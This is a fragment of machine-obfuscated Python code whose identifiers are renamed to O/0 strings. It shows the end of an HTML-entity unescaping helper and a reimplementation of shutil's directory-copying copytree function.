    O00OO00O00OO0O00O =re .sub ("(&#[0-9]+)([^;^0-9]+)","\\1;\\2",O00OO00O00OO0O00O )#line:3472
    O00OO00O00OO0O00O =HTMLParser .HTMLParser ().unescape (O00OO00O00OO0O00O )#line:3473
    O00OO00O00OO0O00O =O00OO00O00OO0O00O .replace ("&quot;","\"")#line:3474
    O00OO00O00OO0O00O =O00OO00O00OO0O00O .replace ("&amp;","&")#line:3475
    return O00OO00O00OO0O00O #line:3476
import os #line:3478
from shutil import *#line:3479
def copytree (OOOOOO000O0O00OOO ,O00OOO0O00O00000O ,symlinks =False ,ignore =None ):#line:3480
    O00000O000O000O0O =os .listdir (OOOOOO000O0O00OOO )#line:3481
    if ignore is not None :#line:3482
        OOOO00O00O0O00O0O =ignore (OOOOOO000O0O00OOO ,O00000O000O000O0O )#line:3483
    else :#line:3484
        OOOO00O00O0O00O0O =set ()#line:3485
    if not os .path .isdir (O00OOO0O00O00000O ):#line:3486
        os .makedirs (O00OOO0O00O00000O )#line:3487
    O0OO00O0OO00O0OO0 =[]#line:3488
    for OO000O00OO0O0OO0O in O00000O000O000O0O :#line:3489
        if OO000O00OO0O0OO0O in OOOO00O00O0O00O0O :#line:3490
            continue #line:3491
        O0OOOO00OO0O0OO00 =os .path .join (OOOOOO000O0O00OOO ,OO000O00OO0O0OO0O )#line:3492
        OOOO0OOOOOOO00O00 =os .path .join (O00OOO0O00O00000O ,OO000O00OO0O0OO0O )#line:3493
        try :#line:3494
            if symlinks and os .path .islink (O0OOOO00OO0O0OO00 ):#line:3495
                OO0OOOOO0O0O0OOOO =os .readlink (O0OOOO00OO0O0OO00 )#line:3496
                os .symlink (OO0OOOOO0O0O0OOOO ,OOOO0OOOOOOO00O00 )#line:3497
            elif os .path .isdir (O0OOOO00OO0O0OO00 ):#line:3498
                copytree (O0OOOO00OO0O0OO00 ,OOOO0OOOOOOO00O00 ,symlinks ,ignore )#line:3499
            else :#line:3500
                copy2 (O0OOOO00OO0O0OO00 ,OOOO0OOOOOOO00O00 )#line:3501
        except Error as OO0000000OO0OO0OO :#line:3502
            O0OO00O0OO00O0OO0 .extend (OO0000000OO0OO0OO .args [0 ])#line:3503
        except EnvironmentError as O00000O0000OO000O :#line:3504
            O0OO00O0OO00O0OO0 .append ((O0OOOO00OO0O0OO00 ,OOOO0OOOOOOO00O00 ,str (O00000O0000OO000O )))#line:3505
    try :#line:3506
        copystat (OOOOOO000O0O00OOO ,O00OOO0O00O00000O )#line:3507
    except OSError as O00000O0000OO000O :#line:3508
        O0OO00O0OO00O0OO0 .extend ((OOOOOO000O0O00OOO ,O00OOO0O00O00000O ,str (O00000O0000OO000O )))#line:3509
